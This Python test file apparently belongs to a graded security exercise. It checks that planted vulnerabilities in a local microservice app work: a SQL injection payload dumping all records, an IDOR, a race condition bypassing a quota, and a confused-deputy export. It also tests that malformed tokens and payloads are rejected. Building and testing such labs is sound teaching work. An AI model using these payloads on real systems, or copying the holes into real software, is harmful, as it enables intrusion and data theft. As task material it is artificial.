import requests
import concurrent.futures
import pytest
import sqlite3

API_GATEWAY = "http://127.0.0.1:5001"

def login(username, password):
    res = requests.post(f"{API_GATEWAY}/api/auth/login", json={"username": username, "password": password})
    assert res.status_code == 200, f"Login failed for {username}"
    return res.json()["token"]

# ---------------------------------------------------------
# 1. EXPLOITABILITY TESTS (Asserting vulnerabilities exist)
# ---------------------------------------------------------

def test_vulnerability_1_sql_injection():
    """Verify TH-01: SQL injection bypasses query filters to dump all datasets."""
    alice_token = login("alice", "AlicePass!123")
    headers = {"Authorization": f"Bearer {alice_token}"}

    payload = "' OR '1'='1"
    res = requests.get(f"{API_GATEWAY}/api/datasets/search?q={payload}", headers=headers)
    assert res.status_code == 200
    records = res.json()

    # Exploit succeeds: both dataset 1 and dataset 2 are returned
    assert len(records) >= 2, "SQL injection failed to dump records"

def test_vulnerability_2_idor():
    """Verify TH-02: Alice can directly access Bob's private dataset (ID 2)."""
    alice_token = login("alice", "AlicePass!123")
    headers = {"Authorization": f"Bearer {alice_token}"}

    res = requests.get(f"{API_GATEWAY}/api/datasets/2", headers=headers)
    assert res.status_code == 200
    
    # Exploit succeeds: Alice accessed Bob's data (owner_id 3)
    assert res.json()["owner_id"] == 3, "IDOR failed to access Bob's data"

def test_vulnerability_3_race_condition():
    """Verify TH-03: Concurrent requests bypass quota limits."""
    # Reset quota to exactly 1 for a clean test state
    conn = sqlite3.connect("resource_service/research_vault.db")
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET export_quota = 1 WHERE username = 'alice'")
    conn.commit()
    conn.close()

    alice_token = login("alice", "AlicePass!123")
    headers = {"Authorization": f"Bearer {alice_token}"}

    def call_consume():
        return requests.post(f"{API_GATEWAY}/api/datasets/consume-quota", headers=headers)

    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
        f1 = executor.submit(call_consume)
        f2 = executor.submit(call_consume)
        r1 = f1.result()
        r2 = f2.result()

    # Exploit succeeds: Both parallel calls bypassed the quota check and succeeded
    assert r1.status_code == 200 and r2.status_code == 200, "Race condition failed to bypass quota"

def test_vulnerability_4_confused_deputy_composition():
    """Verify TH-04: Alice tricks Processing Service into exporting Bob's dataset."""
    alice_token = login("alice", "AlicePass!123")
    headers = {"Authorization": f"Bearer {alice_token}"}

    res = requests.post(f"{API_GATEWAY}/api/export-job", json={"dataset_id": 2}, headers=headers)
    assert res.status_code == 200
    
    # Exploit succeeds: Cross-service export happened without authorization
    assert res.json()["status"] == "COMPLETED"


# ---------------------------------------------------------
# 2. MALFORMED ARTIFACT TESTS (Grading Requirement)
# ---------------------------------------------------------

def test_malformed_artifact_invalid_token():
    """Verify System safely rejects malformed/tampered JWT tokens."""
    headers = {"Authorization": "Bearer this.is.a.malformed.garbage.token"}
    res = requests.get(f"{API_GATEWAY}/api/datasets/search?q=Genomic", headers=headers)
    
    assert res.status_code == 401
    assert "Invalid token" in res.json().get("error", "")

def test_malformed_artifact_missing_payload():
    """Verify System safely rejects malformed JSON payloads."""
    alice_token = login("alice", "AlicePass!123")
    headers = {"Authorization": f"Bearer {alice_token}"}

    res = requests.post(f"{API_GATEWAY}/api/export-job", json={}, headers=headers)
    
    assert res.status_code == 400
    assert "dataset_id required" in res.json().get("error", "")

if __name__ == "__main__":
    pytest.main(["-v", __file__])